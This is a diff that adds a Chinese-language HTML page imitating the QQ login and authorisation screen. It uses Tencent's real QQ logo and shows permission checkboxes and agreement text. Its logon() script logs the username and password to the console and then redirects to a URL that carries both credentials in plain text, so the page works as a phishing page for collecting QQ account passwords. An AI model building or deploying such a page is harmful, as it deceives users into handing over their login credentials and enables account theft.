@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>QQ登录</title>
+        <meta charset="utf-8" />
+        <style>
+            .title{
+                width: 100%;
+                height: 100px;
+                background-color: rgb(83, 178, 255);
+            }
+            .logo{
+                width: 350px;
+                height: 300px;
+                background-image: url(https://imgcache.qq.com/open/connect/widget/pc/login/img/qqlogo_2021.png);
+                float: left;
+                background-repeat: no-repeat;
+                background-size: 100%;;
+            }
+            .input{
+                width: 700px;
+                height: 130px;;
+                font-size: 50px;
+            }
+            .inputbtn{
+                width: 700px;
+                height: 130px;
+                background-color: rgb(55, 118, 255);
+                color: white;
+                font-size: 50px;
+            }
+            body{
+                margin: 0;
+                padding: 0;
+            }
+        </style>
+        <script>
+            function logon() {
+    var usersname = document.getElementById("usersname").value;
+    var pwd = document.getElementById("pwd").value;
+    if (usersname == "") {
+        alert("用户名不可为空")
+        return false
+    }
+    if (pwd == "") {
+        alert("密码不可为空")
+        return false
+    }
+    else {
+        console.log("usersname:" + usersname)
+        console.log("password:" + pwd)
+        info = "InfoMation------"+"'"+ "usersname=" + usersname + ";"+"password=" + pwd + "'"
+        window.location.href=info
+    }
+}
+        </script>
+    </head>
+    <body>
+        <div align="center">
+            <div class="title">
+                <div class="logo"></div>
+            </div>
+            <br />
+            <div align="center">
+                <h1 style="font-size: 50px;">账户密码登录</h1>
+                <br />
+                <input class="input" id="usersname" placeholder="支持QQ号/邮箱/手机号登录" />
+                <input class="input" id="pwd" placeholder="密码" type="password" />
+                <br />
+                <br />
+                <br />
+                <button class="inputbtn" onclick="logon()">登录</button>
+            </div>
+        </div>
+        <div style="width: 100%;height: 30px;"></div>
+        <style>
+            .text {
+                font-size: 40px;
+                text-decoration: none;
+                color:grey
+            }
+        </style>
+        <div align="center">
+            <div style="width: 80%;">
+                <table width="90%">
+                    <td width="33%">
+                        <div align="left">
+                            <a href="" class="text">忘了密码?</a>
+                        </div>
+                    </td>
+                    <td width="33%">
+                        <div align="center">
+                            <a href="" class="text">注册新账号</a>
+                        </div>
+                    </td>
+                    <td width="33%">
+                        <div align="right">
+                            <a href="" class="text">意见反馈</a>
+                        </div>
+                    </td>
+                </table>
+            </div>
+        </div>
+        <div align="center">
+            <style>
+                .line{
+                    width:70%;
+                    height:3px;
+                    background-color:darkgray;
+                }
+            </style>
+            <br />
+            <br />
+            <div class="line"></div>
+            <table width="70%">
+                <td width="25%">
+                    <p style="color:cornflowerblue;font-size:30px">企鹅号视频平台</p>
+                </td>
+                <td width="50%">
+                    <div align="left">
+                        <p style="font-size:30px">将获得一下权限:</p>
+                    </div>
+                </td>
+            </table>
+        </div>
+        <div align="center">
+            <div class="line"></div>
+            <table width="70%">
+                <td width="10%">
+                    <input type="checkbox" style="width:40px;height:40px" value="true" checked />
+                </td>
+                <td>
+                    <p style="font-size:30px">全选</p>
+                </td>
+            </table>
+        </div>
+        <div align="center">
+            <div class="line"></div>
+            <table width="70%">
+                <td>
+                    <input type="checkbox" style="width:40px;height:40px" checked />
+                </td>
+                <td>
+                    <p style="font-size:30px">获得您的昵称、头像、性别</p>
+                </td>
+            </table>
+        </div>
+        <br />
+        <br />
+        <div align="center">
+            <div style="width:70%" align="left">
+                <table>
+                    <td>
+                        <p style="font-size:30px">授权即代表你已同意</p>
+                    </td>
+                    <td>
+                        <p style="color:cornflowerblue;font-size:30px">服务协议</p>
+                    </td>
+                    <td>
+                        <p style="font-size:30px">和</p>
+                    </td>
+                    <td>
+                        <p style="color:cornflowerblue;font-size:30px">QQ隐私保护指引</p>
+                    </td>
+                </table>
+            </div>
+        </div>
+    </body>
+</html>
